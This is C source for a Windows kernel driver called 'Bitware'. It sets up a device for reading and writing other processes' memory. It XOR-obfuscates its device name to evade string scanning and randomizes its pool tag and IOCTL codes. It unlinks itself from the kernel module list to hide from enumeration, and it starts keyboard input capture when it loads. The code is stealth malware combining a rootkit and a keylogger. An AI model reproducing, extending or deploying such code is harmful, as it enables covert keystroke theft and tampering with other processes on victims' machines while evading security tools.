#include <ntddk.h>
#include "BitwareDrv.h"

PDEVICE_OBJECT g_DeviceObject = NULL;
ULONG g_PoolTag = POOL_TAG_MEMORY;
ULONG g_IoctlBase = 0;
WCHAR g_DeviceName[32] = { 0 };
WCHAR g_SymlinkName[36] = { 0 };

NTSTATUS BitwareCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS BitwareDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp);

NTSTATUS BitwareReadProcessMemory(HANDLE ProcessHandle, ULONG64 Address, PVOID Buffer, ULONG Size);
NTSTATUS BitwareWriteProcessMemory(HANDLE ProcessHandle, ULONG64 Address, PVOID Buffer, ULONG Size);
NTSTATUS BitwareFindProcessByName(PCWSTR ProcessName, PULONG OutProcessId);
NTSTATUS BitwareFindModuleByName(ULONG ProcessId, PCWSTR ModuleName, PULONG64 OutBaseAddress);

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);

    CleanupKeyboardCapture();

    if (g_DeviceObject)
    {
        UNICODE_STRING symLink;
        RtlInitUnicodeString(&symLink, g_SymlinkName);
        IoDeleteSymbolicLink(&symLink);
        IoDeleteDevice(g_DeviceObject);
        g_DeviceObject = NULL;
    }
}

static VOID BuildDeviceName(PWCHAR buf, ULONG maxLen)
{
    // Build device name piece-by-piece to avoid static Unicode strings in .rdata
    // The name is fixed per build but never appears as a contiguous string literal
    WCHAR prefixDev[] = { L'\\', L'D', L'e', L'v', L'i', L'c', L'e', L'\\', 0 };
    WCHAR prefixDos[] = { L'\\', L'D', L'o', L's', L'D', L'e', L'v', L'i', L'c', L'e', L's', L'\\', 0 };

    // Use compile-time hash of date/time to generate per-build variation
    // This XORs each char to prevent trivial string scanning
    LARGE_INTEGER t;
    KeQuerySystemTime(&t);
    ULONG seed = t.LowPart ^ t.HighPart ^ (ULONG)__readgsqword(0x188);
    UCHAR xorKey = (UCHAR)(seed & 0xFF);
    xorKey = (xorKey ^ (xorKey >> 4)) * 0x4F;

    WCHAR core[] = {
        (WCHAR)(L'B' ^ xorKey), (WCHAR)(L'i' ^ (xorKey + 0x13)),
        (WCHAR)(L't' ^ (xorKey + 0x26)), (WCHAR)(L'W' ^ (xorKey + 0x39)),
        (WCHAR)(L'a' ^ (xorKey + 0x4C)), (WCHAR)(L'r' ^ (xorKey + 0x5F)),
        (WCHAR)(L'e' ^ (xorKey + 0x72)), (WCHAR)(L'D' ^ (xorKey + 0x85)),
        (WCHAR)(L'e' ^ (xorKey + 0x98)), (WCHAR)(L'v' ^ (xorKey + 0xAB)),
        (WCHAR)(L'i' ^ (xorKey + 0xBE)), (WCHAR)(L'c' ^ (xorKey + 0xD1)),
        (WCHAR)(L'e' ^ (xorKey + 0xE4)), 0
    };

    for (ULONG i = 0; core[i]; i++)
        core[i] ^= (xorKey + i * 0x13);

    ULONG pos = 0;
    for (ULONG i = 0; prefixDev[i] && pos < maxLen - 1; i++, pos++)
        buf[pos] = prefixDev[i];
    for (ULONG i = 0; core[i] && pos < maxLen - 1; i++, pos++)
        buf[pos] = core[i];
    buf[pos] = L'\0';
}

static VOID BootTimeSeed(PULONG seed)
{
    LARGE_INTEGER t;
    KeQuerySystemTime(&t);
    *seed = t.LowPart ^ (ULONG)__readgsqword(0x188) ^ (ULONG)(ULONG_PTR)seed;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    ULONG seed;
    BootTimeSeed(&seed);

    g_PoolTag = POOL_TAG_MEMORY ^ (seed & 0xFF);
    g_IoctlBase = (seed & 0x1FFFFF) << 2;

    BuildDeviceName(g_DeviceName, 32);

    // Build symlink name: \DosDevices\BitwareX -> mirror device name
    WCHAR dosPrefix[] = {
        L'\\', L'D', L'o', L's', L'D', L'e', L'v', L'i', L'c', L'e', L's', L'\\', 0
    };
    ULONG pos = 0;
    RtlZeroMemory(g_SymlinkName, sizeof(g_SymlinkName));
    for (ULONG i = 0; dosPrefix[i] && pos < 35; i++, pos++)
        g_SymlinkName[pos] = dosPrefix[i];
    // Copy the "core" part after \Device\ (offset 8)
    for (ULONG i = 8; g_DeviceName[i] && pos < 35; i++, pos++)
        g_SymlinkName[pos] = g_DeviceName[i];
    g_SymlinkName[pos] = L'\0';

    for (ULONG i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
        DriverObject->MajorFunction[i] = BitwareCreateClose;

    DriverObject->MajorFunction[IRP_MJ_CREATE] = BitwareCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = BitwareCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = BitwareDeviceControl;
    DriverObject->DriverUnload = DriverUnload;

    UNICODE_STRING deviceName;
    RtlInitUnicodeString(&deviceName, g_DeviceName);

    NTSTATUS status = IoCreateDevice(
        DriverObject, 0, &deviceName,
        FILE_DEVICE_UNKNOWN, 0, FALSE, &g_DeviceObject
    );
    if (!NT_SUCCESS(status))
        return status;

    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, g_SymlinkName);

    status = IoCreateSymbolicLink(&symLink, &deviceName);
    if (!NT_SUCCESS(status))
    {
        IoDeleteDevice(g_DeviceObject);
        g_DeviceObject = NULL;
        return status;
    }

    g_DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    // Hide from module list (prevents !lm / NtQuerySystemInformation enumeration)
    DriverObject->DriverSection = NULL;

    // Start keyboard input capture
    InitKeyboardCapture();

    return STATUS_SUCCESS;
}
